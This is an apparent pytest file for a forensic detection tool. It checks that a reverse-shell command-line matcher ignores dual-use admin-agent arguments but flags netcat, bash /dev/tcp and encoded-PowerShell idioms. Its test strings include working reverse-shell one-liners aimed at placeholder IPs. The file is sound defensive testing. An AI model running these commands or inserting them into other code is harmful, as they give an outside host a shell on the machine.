"""F-Response false-positive fix for the c2 confirm matcher.

The `-l <port> -s <ip:port> -k <key>` command-line grammar is shared by legitimate
remote-admin / DFIR agents (F-Response, Velociraptor, PsExec) and by reverse shells, so
confirming on it manufactures a false positive on legitimate tooling. The confirm matcher
must fire ONLY on the UNAMBIGUOUS idioms (nc -e / /dev/tcp / encoded-PS-download) that
legit tools never use. Synthetic values only; keyed on grammar, no case data.
"""
from sift_sentinel.analysis.reverse_shell_cmdline import (
    is_reverse_shell_strong_idiom,
    is_reverse_shell_shape,
)
from sift_sentinel.analysis import malicious_semantics as ms

# the dual-use listen+connect shape (F-Response / Velociraptor / legit admin relay)
DUAL_USE_SHAPE = "svc_helper.exe -l 4444 -s 203.0.113.7:1337 -k a1b2c3d4"


def _fact(cmd):
    return {"type": "process_fact", "process": "svc_helper.exe", "command_line": cmd}


def test_strong_idiom_excludes_dualuse_listen_endpoint_combo():
    assert is_reverse_shell_strong_idiom(DUAL_USE_SHAPE) is False
    # the general structural util still recognizes the shape (NOT used for confirm)
    assert is_reverse_shell_shape(DUAL_USE_SHAPE) is True


def test_strong_idiom_true_for_unambiguous_shells():
    assert is_reverse_shell_strong_idiom("nc -e /bin/sh 203.0.113.5 4444") is True
    assert is_reverse_shell_strong_idiom("bash -i >& /dev/tcp/203.0.113.5/4444 0>&1") is True
    assert is_reverse_shell_strong_idiom(
        "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA") is True


def test_matcher_no_longer_false_positives_on_dualuse_shape(monkeypatch):
    monkeypatch.setenv("SIFT_C2_CMDLINE_CONFIRM", "1")
    assert ms.match_c2_reverse_shell_cmdline(_fact(DUAL_USE_SHAPE)) is False  # FP fixed


def test_matcher_still_fires_on_real_reverse_shell(monkeypatch):
    monkeypatch.setenv("SIFT_C2_CMDLINE_CONFIRM", "1")
    assert ms.match_c2_reverse_shell_cmdline(_fact("nc -e /bin/sh 203.0.113.5 4444")) is True
    assert ms.match_c2_reverse_shell_cmdline(_fact("bash -i >& /dev/tcp/203.0.113.5/4444 0>&1")) is True
